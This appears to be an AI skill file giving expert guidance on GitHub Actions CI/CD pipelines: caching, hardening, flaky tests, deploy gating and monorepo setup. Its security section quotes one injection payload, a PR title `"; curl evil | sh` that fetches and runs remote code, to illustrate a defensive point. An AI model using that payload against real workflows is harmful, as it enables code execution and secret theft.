---
name: ci-cd-pipelines
description: Load when designing, writing, or debugging CI/CD pipelines — GitHub Actions workflows, build/test/deploy stages, caching, flaky builds, pipeline security (secrets, untrusted PRs, action pinning), deployment gating, monorepo CI, or self-hosted runner decisions.
---

# CI/CD Pipelines

## Core mental model

- **The pipeline is a product with two SLOs: time-to-signal and trustworthiness.** Every developer pays its latency dozens of times a day, and every red build they don't believe erodes the only thing CI sells — a green check that *means something*. Optimize feedback time for the common case (small PR, nothing broken) before anything else.
- **Fail fast, spend late.** Order stages by cost-per-bit-of-signal: lint/typecheck/compile (seconds, catch most mechanical errors) → unit tests → build artifacts → integration/e2e (minutes, flaky, expensive) → deploy. Parallelize everything without a true data dependency; a pipeline that runs lint *after* a 20-minute e2e suite is burning both compute and attention.
- **CI is remote code execution as a service.** A pipeline runs code from the repo with access to secrets and cloud credentials. Every design question about security reduces to: *whose code runs, with whose privileges?* Untrusted (fork PR) code must never meet secrets.
- **Determinism is the foundation caching and trust sit on.** Same commit → same result. Every `latest` tag, unpinned action, floating dependency, or wall-clock-dependent test is a place where a build can differ from its re-run — and where "re-run until green" culture starts.
- **Artifacts flow forward; nothing is rebuilt.** Build once, attest/fingerprint it, then promote *that artifact* through staging → prod. Rebuilding per environment means you tested one binary and shipped another.

## Pipeline design — the reasoning chain

For a new or slow pipeline, ask in order:

1. **What's the critical path?** Draw the DAG; the answer to "why is CI 25 minutes" is the longest chain, not the total. Split test suites into parallel shards before optimizing individual tests.
2. **What runs that didn't need to?** Docs-only changes running e2e; every PR building multi-arch images only deploys need. Path filters and conditional jobs are the cheapest wins.
3. **What's re-downloaded or re-built that could be cached?** (Next section.)
4. **What's serialized by policy, not dependency?** Deploy jobs waiting on unrelated matrix legs; merge queues can decouple "PR feedback" (fast subset) from "merge validation" (full suite).
5. **Only then** optimize individual steps (bigger runners, test selection).

## Caching strategy per ecosystem

The universal pattern: **key on the lockfile hash, restore-key on a prefix**, cache the *package cache*, not installed outputs (unless the tool supports it cleanly).

```yaml
- uses: actions/cache@v4
  with:
    path: ~/.npm            # pip: ~/.cache/pip · Go: ~/go/pkg/mod + ~/.cache/go-build · cargo: registry+git
    key: npm-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}
    restore-keys: npm-${{ runner.os }}-
```

- Setup actions (`actions/setup-node`/`setup-python`/`setup-go` with `cache:` input) do this for you — prefer them to hand-rolled cache steps.
- Docker layer caching in CI: `docker/build-push-action` with `cache-from`/`cache-to` (`type=gha` or a registry cache ref). Pair with a cache-mount-ordered Dockerfile or it caches nothing useful.
- **The cache-poisoning tradeoff**: caches are shared state writable by CI jobs. GitHub scopes cache *writes* by branch (PR branches can't poison main's cache; children can read parent-branch caches), but a compromised job on a trusted branch can seed poisoned caches consumed by later privileged jobs — a known post-exploitation technique. Rules: never cache anything *executable-by-privileged-jobs* keyed loosely; release/signing jobs should build from scratch or from caches only trusted branches can write; never put secrets in caches. When in doubt for the release path, correctness > speed: skip the cache.
- Cache hit rate is a metric worth tracking; a cache that misses 60% of the time (over-specific key, evicted by size limits) is pure overhead.

## GitHub Actions specifics (as of 2026)

- **Reusable workflows vs composite actions**: a reusable workflow (`workflow_call`) is a *job-level* unit — own runner, own job structure, appears as separate check; use for org-standard pipelines ("the Node service pipeline"). A composite action is a *step-level* unit spliced into the caller's job — shares its filesystem/env; use for repeated step bundles ("install-and-auth"). Rule of thumb: orchestrate with reusable workflows, dedupe steps with composite actions. Reusable workflows can be centrally versioned in a `.github`/platform repo and pinned by ref.
- **OIDC everywhere, long-lived cloud keys nowhere.** `permissions: id-token: write` + `aws-actions/configure-aws-credentials` (or Azure/GCP equivalents) exchanges a short-lived, claims-scoped token for cloud creds. Scope the cloud trust policy to repo *and* environment/ref (`repo:org/repo:environment:prod`), not `repo:org/*:*`. Newer hardening: immutable repo/owner IDs in the `sub` claim and custom-property claims allow trust policies that survive repo renames and cover repo classes — use them. A long-lived `AWS_SECRET_ACCESS_KEY` in repo secrets is a finding, not a pattern.
- **Concurrency groups**: `concurrency: { group: deploy-${{ github.ref }}, cancel-in-progress: false }` serializes deploys; with `cancel-in-progress: true` on PR groups, obsolete pushes stop burning runners. Two deploy runs interleaving on one environment is a real corruption mode — every deploy workflow needs a concurrency group.
- **Runners**: `ubuntu-24.04-arm` gives cheaper ARM builds and native multi-arch (no QEMU); larger runners (`-16-cores` etc.) are the right fix for genuinely parallel workloads, a money fire for I/O-bound ones. Measure before upsizing.

## Security posture

- **The classic hole: `pull_request_target` + checkout of PR head.** `pull_request` from a fork runs with read-only token and no secrets — safe. `pull_request_target` runs *with* secrets in the base-repo context; the moment such a workflow checks out `github.event.pull_request.head.sha` (or head ref) and runs anything attacker-influenceable — install scripts, tests, even linters with plugin loading — a fork PR exfiltrates your secrets. If you need both PR code and privileges, split: unprivileged `pull_request` workflow produces artifacts; a separate privileged `workflow_run` job consumes them *as data, never executing them*.
- **Script injection**: `run: echo "${{ github.event.pull_request.title }}"` lets a PR titled `"; curl evil | sh` run code. Never interpolate attacker-controlled context into `run:`; pass through `env:` and quote.
- **Pin third-party actions to full commit SHAs** (`uses: some/action@<40-char-sha> # v4.1.2`), not tags — tags are mutable, and real supply-chain attacks (e.g. the 2025 tj-actions/changed-files compromise) worked by moving tags to malicious commits. Dependabot/Renovate keep SHA pins fresh. GitHub's immutable-actions publishing (OCI-backed) is rolling out as of 2026 and reduces this risk class, but SHA-pinning remains the portable rule.
- **Least privilege by default**: top-level `permissions: contents: read`, grant per-job additions explicitly. Repo-wide secrets available to all workflows are a smell — scope secrets to **environments** with required reviewers so prod credentials only exist inside gated jobs.
- **Attestation** (as of 2026): `actions/attest-build-provenance` generates SLSA provenance for artifacts/images (GA since 2024, increasingly default-on for public repos); verify at deploy time (`gh attestation verify`, Kubernetes admission policy). This is cheap to add and closes the "where did this artifact actually come from" gap.

## Flaky pipeline economics

A 2%-flaky required suite on 50 PRs/day = a false red every day; devs learn "re-run fixes it," and now *real* failures get re-run too — the pipeline's signal is gone, which is the expensive part (not the compute). Policy that works: auto-detect flakes (fail→pass on retry with same SHA), quarantine them out of the required path *visibly* (ticket, owner, deadline), and treat quarantine size as a team health metric. Blanket `retry: 3` on everything is signal destruction dressed as pragmatism — retries are acceptable narrowly (network-touching steps), never as suite-wide default. Root causes are boringly consistent: shared state between tests, real network calls, time dependence, port collisions, missing await/race in test setup.

## Deployment gating and promotion

- Model environments as **GitHub Environments** with protection rules: required reviewers for prod, wait timers, branch restrictions; environment-scoped secrets mean the prod token physically doesn't exist in un-gated jobs.
- Progressive promotion: artifact (by digest) → dev (auto) → staging (auto + smoke tests) → prod (approval or auto with canary + rollback trigger). The promotion unit is the *artifact digest*, never a rebuild.
- Post-deploy verification belongs *in the pipeline*: a deploy job that ends at `kubectl apply` hasn't deployed, it has requested — poll rollout status and run smoke checks, fail loudly.
- Approval fatigue is real: an approval step everyone rubber-stamps in 4 seconds is worse than automated gates (canary metrics, error-budget checks) because it launders responsibility. Prefer machines checking measurable things; save humans for genuinely judgment-laden releases.

## Monorepo CI

- **Path filtering** (`dorny/paths-filter`, or native `on.push.paths` for whole-workflow gating) is step one: don't test what didn't change. Its limit: file paths don't know your dependency graph — changing a shared lib must rebuild dependents.
- **Affected-graph builds** are step two: Nx/Turborepo/Bazel/Pants compute the dependency-closure of changed files and run only affected targets, with remote caching so unchanged targets are cache hits even on cold runners. Adopt when path filters start needing hand-maintained "if lib changed, test these 14 apps" maps — that map *is* a dependency graph, badly.
- Keep one required status check that aggregates (a "CI passed" fan-in job with `if: always()` checking needs' results) so branch protection doesn't need updating per-path — and so skipped jobs don't auto-satisfy required checks.
- **Merge queues** solve the monorepo's other problem: two PRs that pass independently but break combined. A queue tests each PR against the head of the queue (main + PRs ahead of it) before merging. Adopt when merge rate makes "rebase and re-run" a daily tax; below ~20 merges/day on the affected branch it's usually ceremony.

The fan-in + path-filter skeleton:

```yaml
jobs:
  changes:
    runs-on: ubuntu-latest
    outputs:
      web: ${{ steps.filter.outputs.web }}
      api: ${{ steps.filter.outputs.api }}
    steps:
      - uses: actions/checkout@<sha>
      - uses: dorny/paths-filter@<sha>
        id: filter
        with:
          filters: |
            web: ['apps/web/**', 'packages/shared/**']   # shared lib fans out — this map
            api: ['apps/api/**', 'packages/shared/**']   # is why affected-graph tools exist
  test-web:
    needs: changes
    if: needs.changes.outputs.web == 'true'
    # ...
  ci-passed:                       # the ONLY required status check
    needs: [test-web, test-api]
    if: always()
    runs-on: ubuntu-latest
    steps:
      - run: |
          [[ "${{ contains(needs.*.result, 'failure') || contains(needs.*.result, 'cancelled') }}" == "false" ]]
```

## Self-hosted runners

Reasons that justify them: network access to private resources, GPUs/exotic hardware, extreme cost at scale, compliance. The bill you accept: you now own patching, autoscaling, cache locality, and — critically — **isolation**: a persistent runner accumulates state between jobs (poisoned tools, leaked creds), and self-hosted runners on *public* repos are a standing RCE invitation (fork PRs run code on your infra — GitHub itself warns against this). If you must: ephemeral runners (fresh VM/container per job, e.g. actions-runner-controller on k8s), never public-repo exposure, isolate the runner's cloud permissions. If your reason is only "hosted is slow," price larger hosted runners first — they're cheaper than an SRE maintaining a runner fleet.

## Failure modes & pitfalls

- **`GITHUB_TOKEN` pushes don't trigger workflows.** A workflow that commits/pushes (or creates a PR) with the default `GITHUB_TOKEN` will not fire `push`/`pull_request` workflows on that commit — deliberate recursion protection. The "bot PR shows no CI" mystery. Fix: a GitHub App token or fine-grained PAT for the push, or `workflow_dispatch` the follow-up explicitly.
- **Fan-in jobs that pass when upstreams were skipped.** A required check on a conditionally-skipped job is satisfied by the *skip*. The aggregate job must run `if: always()` and then explicitly fail on bad upstreams: `if: contains(needs.*.result, 'failure') || contains(needs.*.result, 'cancelled')` → exit 1. Otherwise path-filtered pipelines quietly let untested merges through.
- **`success()` semantics in `if:`.** Every `if:` without an explicit status function has an implicit `success()` — so `if: steps.x.outcome == 'failure'` alone never runs (the job already failed). Cleanup/notify steps need `if: always()` or `if: failure()` spelled out.
- **Matrix `fail-fast` hiding the real failure.** Default `fail-fast: true` cancels sibling legs on first failure; the canceled legs show as canceled, and people chase the wrong leg. For diagnostic-value matrices set `fail-fast: false`; keep fail-fast for pure gating.
- **Reusable workflows and the secrets wall.** Called workflows don't see the caller's secrets unless passed (`secrets: inherit` or explicit). Also `env:` at the caller's workflow level does *not* propagate into called workflows — pass `inputs`. Symptom: works inline, breaks when extracted.
- **`pull_request_target` + head checkout.** The canonical hole (see Security posture). Grep for it in every audit; it recurs because someone needed "PR labels + secrets" and copied a snippet.
- **Cancel-in-progress on deploy groups.** `cancel-in-progress: true` copied from the PR-CI snippet onto a deploy workflow kills a half-finished production deploy when someone merges again. Deploy groups: `cancel-in-progress: false` (queue), always.
- **Shallow checkout breaking version logic.** `actions/checkout` defaults to depth 1 — no tags, no history. Anything computing versions (`git describe`), changelogs, or affected-since-main diffs needs `fetch-depth: 0` (or `fetch-tags: true`) and will fail in subtle ways without it.
- **No `timeout-minutes`.** Default job timeout is 6 hours; one hung integration test holds a runner (and a concurrency slot, and a merge queue) hostage. Set a timeout on every job; a job's timeout is documentation of its expected duration.
- **Cache key without the OS/arch.** Same lockfile, different `runner.os`/arch (x64 vs ARM) → restored native binaries crash. Key must include `runner.os` (and arch if you mix runners); this got newly relevant with ARM runners.
- **Monorepo `hashFiles` scoped wrong.** `hashFiles('package-lock.json')` at repo root when the app's lockfile lives in `apps/web/` — cache never invalidates (or never hits). `hashFiles` paths are repo-root-relative globs: `hashFiles('apps/web/package-lock.json')`.
- **Outputs that vanish.** Job outputs must be declared (`outputs:` mapping from a step) — steps' outputs aren't automatically job outputs; and a matrix job's outputs collapse to whichever leg wrote last. If a matrix must publish per-leg results, use artifacts.
- **Bot-authored `workflow_run` privilege confusion.** `workflow_run` runs with base-repo privileges by design — that's the point of the split pattern — so treat everything it reads from the triggering run's artifacts as untrusted *data*: validate, never execute, and don't pass it into shell interpolation.
- **`continue-on-error` as flake management.** It turns the step green *and* the failure invisible — nobody looks at a passing build. Legitimate uses: canary legs of a matrix (new language version you're evaluating), optional annotations. Never on tests you intend to fix "later."
- **Artifact assumptions.** Default artifact retention is bounded (90 days max, often configured lower) — release artifacts belong in a registry/releases, not `actions/upload-artifact`. And artifacts are scoped per run: passing files between *workflows* needs explicit download by run ID (`workflow_run` pattern) or a registry, not the same-name convention that works within one run.
- **Environment protection that only guards the workflow file's branch.** Environment rules bind to the *job's* environment declaration; a writer with push access to any branch can author a new workflow targeting the environment unless you also restrict which branches may deploy to it (environment branch protection) — set both, or the approval gate is decoration.
- **Self-hosted runner on a public repo.** Fork PRs execute on your infrastructure with network access. This is not a configuration nuance; it's the whole vulnerability. Hosted runners for public repos, full stop.

## Worked micro-example: a hardened deploy job

```yaml
deploy-prod:
  needs: [build]
  runs-on: ubuntu-latest
  timeout-minutes: 20
  environment: production            # gated: required reviewers + env-scoped secrets
  concurrency:
    group: deploy-prod               # serialize; never cancel a running deploy
    cancel-in-progress: false
  permissions:
    id-token: write                  # OIDC only — no stored cloud keys
    contents: read
  steps:
    - uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8   # pinned SHA (comment the tag)
    - uses: aws-actions/configure-aws-credentials@a159d7bb5354cf786f855f2f5d1d8d768d9a08d1
      with:
        role-to-assume: arn:aws:iam::123456789012:role/gha-prod-deploy  # trust policy scoped to repo+environment
        aws-region: us-east-1
    - name: Verify artifact provenance, then promote by digest
      env:
        IMAGE: ${{ needs.build.outputs.image-digest }}   # promote what was built, never rebuild
      run: |
        gh attestation verify oci://"$IMAGE" --owner my-org
        ./scripts/deploy.sh "$IMAGE"
    - name: Post-deploy smoke check
      run: ./scripts/smoke.sh https://api.example.com   # deploy isn't done at 'apply'
```

Every line is a decision from the sections above: environment gating, OIDC, pinning, concurrency, digest promotion, attestation verification, and verification-in-pipeline.

## Priors an expert carries

- A red main branch is an incident, not a backlog item — either revert within minutes or fix-forward within the hour; a tolerated red main destroys the meaning of every other signal.
- When CI "randomly" fails, the cause is (in order of prior probability): test isolation/shared state, real network dependence, resource contention on the runner, cache staleness — actual infrastructure flakiness is the last hypothesis, not the first.
- When a pipeline is slow, the fix is (in order of expected value): stop running unneeded work, parallelize, cache, shard — buy bigger hardware only after those, and measure before each step.
- Security reviews of workflows find the same four issues every time: `pull_request_target` misuse, context injection into `run:`, tag-pinned actions, and over-broad token permissions. Grep for all four before reading anything else.

## How an expert thinks through it: "CI takes 30 minutes and everyone re-runs it"

Two symptoms — slow and untrusted — related but distinct; fix trust first, because speeding up a suite nobody believes just produces faster noise. Pull 30 days of run data (`gh run list --json`): 8% of failures pass on same-SHA re-run — flaky. Top offenders: two e2e specs (shared seeded user; parallel runs collide) and one integration test calling a real third-party sandbox API. Quarantine all three today with tickets; required suite is now trustworthy. Now latency: the DAG shows lint (2m) → build (6m) → unit (9m) → e2e (13m), fully serialized. Lint/build/unit have no mutual dependency — parallelize: wall time drops to ~13m (e2e is the critical path). Shard e2e 4-way: ~7m total. Dependency install is 3m of every job: lockfile-keyed cache brings it to 20s. Now ~8 minutes. Considered and rejected: 16-core runners for everything (the suites are I/O and network bound — measured first, saved the money); test-impact-analysis for e2e (worthwhile someday, but sharding was an hour of work for most of the win — do cheap-and-dumb before smart); deleting the e2e suite (it catches real regressions; the problem was isolation, not existence). Stopping rule: p50 PR feedback under 10 minutes, same-SHA re-run pass rate >99% — beyond that, marginal minutes cost more engineering than they return.

## Verification / self-check

- Same-SHA re-run twice: identical result? If not, find the nondeterminism before shipping the pipeline.
- Security audit greps: any `pull_request_target` that checks out PR head? Any `${{ github.event.* }}` interpolated into `run:`? Any third-party action pinned to a tag? Any long-lived cloud key that OIDC could replace? Each is a concrete finding.
- Trace one artifact: can you go from prod back to commit, workflow run, and attestation? If deploy rebuilds instead of promotes, fix that first.
- Kill a dependency mid-run (or revoke a token): does the pipeline fail *clearly*, or hang/mislead?
- Stopping rule: pipeline work is done when feedback is fast (sub-10-min PR signal), green means green (>99% same-SHA reproducibility), secrets can't meet untrusted code, and deploys are gated promotions of attested artifacts. Past that, pipeline tinkering is procrastination with YAML.
